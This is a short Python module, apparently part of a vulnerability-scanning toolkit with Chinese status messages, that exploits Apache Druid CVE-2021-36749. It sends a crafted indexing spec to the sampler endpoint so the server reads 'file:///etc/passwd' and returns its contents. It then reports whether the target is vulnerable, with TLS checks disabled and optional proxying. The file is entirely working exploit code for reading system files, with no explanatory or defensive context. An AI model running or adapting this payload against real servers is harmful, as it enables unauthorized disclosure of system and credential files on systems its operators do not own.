import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        json_data = {
            "type": "index",
            "spec": {
                "type": "index",
                "ioConfig": {
                    "type": "index",
                    "inputSource": {
                        "type": "http",
                        "uris": [
                            "file:///etc/passwd"
                        ]
                    },
                    "inputFormat": {
                        "type": "regex",
                        "pattern": "(.*)",
                        "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
                        "columns": [
                            "raw"
                        ]
                    }
                },
                "dataSchema": {
                    "dataSource": "sample",
                    "timestampSpec": {
                        "column": "!!!_no_such_column_!!!",
                        "missingValue": "1970-01-01T00:00:00Z"
                    },
                    "dimensionsSpec": {
                    }
                },
                "tuningConfig": {
                    "type": "index"
                }
            },
            "samplerConfig": {
                "numRows": 500,
                "timeoutMs": 15000
            }
        }
        aa1 = requests.post(url1+'druid/indexer/v1/sampler?for=connect',json=json_data,proxies=proxies,verify=False,timeout=15,cookies=s_cookie)
        if aa1.status_code==200 and 'root' in aa1.text:
            cdd='[+]漏洞存在\n'+str(aa1.text)
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Apache CVE-2021-36749 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)